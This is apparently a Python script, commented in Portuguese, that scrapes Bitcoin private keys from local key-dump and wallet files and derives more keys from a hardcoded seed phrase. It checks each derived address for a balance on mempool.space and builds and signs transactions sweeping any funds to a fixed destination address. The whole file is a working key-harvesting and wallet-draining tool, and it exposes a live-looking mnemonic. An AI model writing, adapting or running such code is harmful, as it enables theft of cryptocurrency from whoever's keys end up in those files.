import requests
import re
import time
from bitcoinlib.keys import Key, HDKey
from bitcoinlib.transactions import Transaction

def extract_potential_keys(filename):
    keys_found = []
    try:
        # Abre o arquivo ignorando erros de codificação
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        # 1. Padrão WIF (L..., K..., 5...)
        wif_pattern = re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content)
        keys_found.extend(wif_pattern)
        
        # 2. Padrão HEX (64 caracteres hexadecimais) - Comum em CSVs
        hex_pattern = re.findall(r'\b[0-9a-fA-F]{64}\b', content)
        for h in hex_pattern:
            try:
                # Converte Hex para WIF para o scanner processar
                k = Key(h, network='bitcoin')
                keys_found.append(k.wif())
            except: continue
            
    except Exception as e:
        print(f"Aviso ao ler {filename}: {e}")
    return keys_found

def scan_ultra_protocol():
    dest_address = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'
    all_keys = []

    # Lista de arquivos com possíveis variações de nome (sem acentos)
    files = [
        'privatekeys.txt', 
        'priv.key.rtf', 
        'chaves_extraidas_e_enderecos_1.txt',
        'chaves_extraídas_e_endereços_1.txt',
        'FDR_Master_Wallet_Complete_20251006_143555_2.csv'
    ]
    
    for f in files:
        found = extract_potential_keys(f)
        if found:
            print(f"Sucesso: {len(found)} chaves extraídas de {f}")
            all_keys.extend(found)

    # Derivação da Mnemônica (Mantendo a lógica de correção)
    try:
        phrase = "tree dwarf rubber off tree finger hair hope emerge earn friend such"
        master = HDKey.from_passphrase(phrase, network='bitcoin')
        for i in range(50):
            for path in [f"m/44'/0'/0'/0/{i}", f"m/84'/0'/0'/0/{i}"]:
                all_keys.append(master.subkey_for_path(path).wif())
    except: pass

    all_keys = list(set(all_keys))
    print(f"Iniciando varredura final de {len(all_keys)} chaves únicas...")

    for wif in all_keys:
        try:
            k = Key(wif, network='bitcoin')
            # Foco em Native SegWit (bc1) e Legacy (1)
            for t_type in ['p2wpkh', 'p2pkh']:
                addr = k.address(witness_type=t_type)
                r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=5)
                if r.status_code == 200 and r.json():
                    utxos = r.json()
                    print(f"!!! SUCESSO: SALDO EM {addr} !!!")
                    utxo = max(utxos, key=lambda x: x['value'])
                    amount = utxo['value'] - 50000 
                    tx = Transaction(network='bitcoin')
                    tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'], address=addr)
                    tx.add_output(value=amount, address=dest_address)
                    tx.sign([wif])
                    print(f"HEX_GEN:{tx.raw_hex()}")
            time.sleep(0.02)
        except: continue

if __name__ == "__main__":
    scan_ultra_protocol()
